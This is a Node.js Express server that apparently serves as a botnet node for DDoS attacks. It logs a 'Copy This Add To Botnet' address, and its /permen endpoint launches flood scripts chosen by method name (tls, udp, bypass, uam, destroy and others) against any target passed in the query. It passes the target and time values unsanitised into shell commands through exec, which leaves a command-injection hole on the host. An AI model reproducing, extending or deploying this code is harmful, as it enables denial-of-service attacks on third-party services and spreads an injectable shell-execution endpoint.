const express = require('express');
const { exec } = require('child_process');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
const scrapeProxies = require('./proxy.js');

async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
  return data;
}

app.get('/permen', (req, res) => {
  const { target, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

  // Eksekusi sesuai methods
  if (methods === 'ninja') {
    console.log('received');
    exec(`node methods/1.js ${target} ${time}`);
  } else if (methods === 'mix') {
    console.log('received');
    exec(`node methods/2.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'strike') {
    exec(`node methods/3.js GET ${target} ${time} 10 90 proxy.txt --full --legit`);
  } else if (methods === 'tls') {
    exec(`node methods/4.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'flood') {
	exec(`node methods/5.js ${target} ${time} 20 60 proxy.txt`);
  } else if (methods === 'https') {
    exec(`node methods/6.js ${target} ${time} 10 100 proxy.txt`);
  } else if (methods === 'raw') {
    exec(`node methods/7.js ${target} ${time}`);
  } else if (methods === 'http-raw') {
    exec(`node methods/7.js ${target} ${time}`);
  } else if (methods === 'tlsv2') {
    exec(`node methods/8.js ${target} ${time} 50 10`);
  } else if (methods === 'storm') {
    exec(`node methods/9.js ${target} ${time} 32 10 proxy.txt`);
  } else if (methods === 'destroy') {
    exec(`node methods/10.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'bypass') {
    exec(`node methods/11.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'glory') {
    exec(`node methods/12.js ${target} ${time} 32 8 proxy.txt`);
  } else if (methods === 'sigma') {
    exec(`node methods/12.js ${target} ${time} 32 10 proxy.txt`);
  } else if (methods === 'harder') {
    exec(`node methods/13.js ${target} ${time} 32 8  proxy.txt`);
  } else if (methods === 'yeah') {
    exec(`node methods/13.js ${target} ${time} 32 10  proxy.txt`);
  } else if (methods === 'pluto') {
    exec(`node methods/14.js ${target} ${time}`);
  } else if (methods === 'uam') {
    exec(`node methods/15.js ${target} ${time} 9 3 proxy.txt`);
  } else if (methods === 'httpx') {
    exec(`node methods/15.js ${target} ${time} 32 8 proxy.txt`);
  } else if (methods === 'udp') {
    exec(`node methods/udp.js ${target} 53 ${time}`)
  } else if (methods === 'tcp') {
    exec(`node methods/1.js ${target}:443 ${time}`);
  } else if (methods === 'java') {
    exec(`node methods/java.js ${target} ${time} 32 4 proxy.txt`);
  } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  fetchData();
});
